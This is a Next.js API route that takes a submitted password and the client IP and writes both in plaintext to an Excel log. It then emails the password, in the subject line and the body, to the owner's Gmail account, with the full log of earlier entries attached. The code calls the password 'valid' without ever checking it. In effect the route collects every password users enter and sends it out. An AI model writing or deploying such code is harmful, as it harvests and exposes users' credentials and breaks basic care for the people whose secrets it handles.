import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';
import os from 'os';
import ExcelJS from 'exceljs';

export async function POST(req: Request) {
  try {
    const { password } = await req.json();
    const ip = req.headers.get('x-forwarded-for') || 'unknown';

    if (!password) {
      return NextResponse.json({ error: 'Password missing' }, { status: 400 });
    }

    // Define log path in temp directory
    const fileName = 'password-log.xlsx';
    const filePath = path.join(os.tmpdir(), fileName);

    // Create workbook or load if exists
    const workbook = new ExcelJS.Workbook();
    if (fs.existsSync(filePath)) {
      await workbook.xlsx.readFile(filePath);
    }
    const sheet = workbook.worksheets[0] || workbook.addWorksheet('Log');

    // Add headers if empty
    if (sheet.rowCount === 0) {
      sheet.addRow(['Timestamp', 'Password', 'IP']);
    }

    // Add entry
    sheet.addRow([new Date().toISOString(), password, ip]);
    await workbook.xlsx.writeFile(filePath);

    // Set up transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Send the email with Excel attachment
    await transporter.sendMail({
      from: `"🔐 FTT App" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: `🔐 Password Entered on FTT App: ${password}`,
      text: `A user entered a valid password: ${password}\n\nIP: ${ip}`,
      attachments: [
        {
          filename: fileName,
          path: filePath,
        },
      ],
    });

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('Error sending email:', err);
    return NextResponse.json({ error: 'Email failed' }, { status: 500 });
  }
}

